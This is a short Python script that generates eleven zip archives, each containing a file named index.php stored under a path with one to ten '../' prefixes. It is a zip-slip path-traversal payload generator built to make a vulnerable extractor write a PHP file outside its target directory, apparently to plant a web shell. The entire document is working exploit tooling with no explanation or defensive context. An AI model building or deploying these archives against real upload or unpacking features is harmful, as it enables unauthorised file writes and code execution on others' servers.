import zipfile
filein = "index.php"
print("[i] FileIn: %s\n" % filein)
depth = ""
for i in range(11):
  zipname = "depth-%02d.zip" % i
  print("[i] ZipName: %s" % zipname)
  with zipfile.ZipFile(zipname , 'w') as zip:
    filezip = "%s%s" % (depth, filein)
    print("[i] ZipFile: %s" % filezip)
    zip.write(filein, filezip)
    depth += "../"
print("\n[i] Done")